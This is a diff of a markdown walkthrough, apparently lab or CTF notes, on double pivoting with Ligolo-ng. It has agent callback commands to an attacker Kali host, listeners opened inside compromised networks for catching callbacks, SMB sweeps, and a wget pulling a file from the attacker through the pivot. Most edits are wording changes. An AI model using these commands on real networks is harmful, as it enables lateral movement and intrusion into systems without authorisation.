@@ -70,7 +70,7 @@ Launches the Ligolo C2-style console and listens for incoming agent connections 
 ./agent -connect 10.10.14.14:11601 -ignore-cert
 ```
 
-The agent phones home to your proxy over the VPN-reachable external IP, establishing Layer 1.
+The agent phones home to the proxy over the VPN-reachable external IP, establishing Layer 1.
 
 **4. In the proxy console, select the agent and bind it to `tunnel1`**
 
@@ -94,7 +94,7 @@ Tells Kali's kernel: any traffic for `172.16.5.0/24` should go out via `tunnel1`
 listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
 ```
 
-Opens a listening port _inside_ Target 1's network (reachable from hosts in `172.16.5.0/24`) and forwards connections back to your local proxy port — this is what lets a second agent (deeper in the network) dial back in.
+Opens a listening port **inside** Target 1's network (reachable from hosts in `172.16.5.0/24`) and forwards connections back to the local proxy port. This is what lets a second agent (deeper in the network) dial back in.
 
 **7. Verify reachability**
 
@@ -102,11 +102,11 @@ Opens a listening port _inside_ Target 1's network (reachable from hosts in `172
 netexec smb 172.16.5.0/24
 ```
 
-Confirms your route/tunnel works by sweeping SMB across the newly reachable subnet.
+Confirms route/tunnel works by sweeping SMB across the newly reachable subnet.
 
 ---
 
-## Pivot 2 — Into Target 2's Internal Range (Pivot Through the Pivot)
+## 2nd Pivot on 2nd internal range
 
 **1. Create and bring up `tunnel2` on Kali**
 
@@ -115,7 +115,7 @@ sudo ip tuntap add user root mode tun tunnel2
 sudo ip link set tunnel2 up
 ```
 
-A second, separate TUN interface — one per layer, so routes don't collide.
+A second, separate TUN interface.
 
 **2. Run the agent on Target 2, connecting to Target 1's internal IP (not Kali directly)**
 
@@ -123,7 +123,7 @@ A second, separate TUN interface — one per layer, so routes don't collide.
 .\agent.exe -connect 172.16.5.10:11601 -ignore-cert
 ```
 
-Target 2 can't reach Kali directly — it can only reach Target 1 — so it dials the listener you opened in step 6 above, which proxies the connection back to your Ligolo console.
+Target 2 can't reach Kali directly, it can only reach Target 1, so it dials the listener opened in step 6 above, which proxies the connection back to your Ligolo console.
 
 **3. In the proxy console, select the new agent session and bind it to `tunnel2`**
 
@@ -131,7 +131,7 @@ Target 2 can't reach Kali directly — it can only reach Target 1 — so it dial
 start --tun tunnel2
 ```
 
-Make sure you select the correct (new) session before running this — this activates Layer 2.
+Make sure to select the correct (new) session before running this. This activates Layer 2.
 
 **4. Route Target 2's internal subnet through `tunnel2`**
 
@@ -148,12 +148,12 @@ listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
 listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
 ```
 
-Opens 443/80 on the Target 2 side of the tunnel and forwards them back to the matching local port on Kali — useful for catching callbacks or serving files, since 80/443 are often allowed through firewalls/AV.
+Opens 443/80 on the Target 2 side of the tunnel and forwards them back to the matching local port on Kali, useful for catching callbacks or serving files, since 80/443 are often allowed through firewalls/AV.
 
 **6. Pull a file from Kali through Target 1's internal IP**
 
 ```powershell
-wget http://172.16.5.10/ph03n1x -outfile ph03n1x
+wget http://172.16.5.10/file -outfile ph03n1x
 ```
 
 Target 2 requests the file from Target 1's internal IP; the listener on `tunnel1` forwards it back to whatever you're hosting on Kali (e.g. `python3 -m http.server`).
